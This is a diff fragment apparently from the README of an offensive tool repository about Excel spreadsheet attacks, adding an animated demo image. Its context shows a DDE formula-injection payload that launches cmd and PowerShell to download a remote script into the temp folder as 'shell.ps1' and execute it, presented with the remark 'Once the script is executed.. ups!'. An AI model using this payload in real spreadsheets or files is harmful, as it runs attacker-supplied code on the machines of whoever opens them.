@@ -523,4 +523,7 @@ Once the script is executed.. ups!
 =cmd|' /C powershell Invoke-WebRequest "https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/examples/pcinfo.ps1" -OutFile "$env:Temp\shell.ps1"; powershell -file "$env:Temp\shell.ps1"'!notthissheet
 ```
 
+<p align="center">
+  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/ezgif-2-6ffa2f57b6.gif"/>
+</p>
 
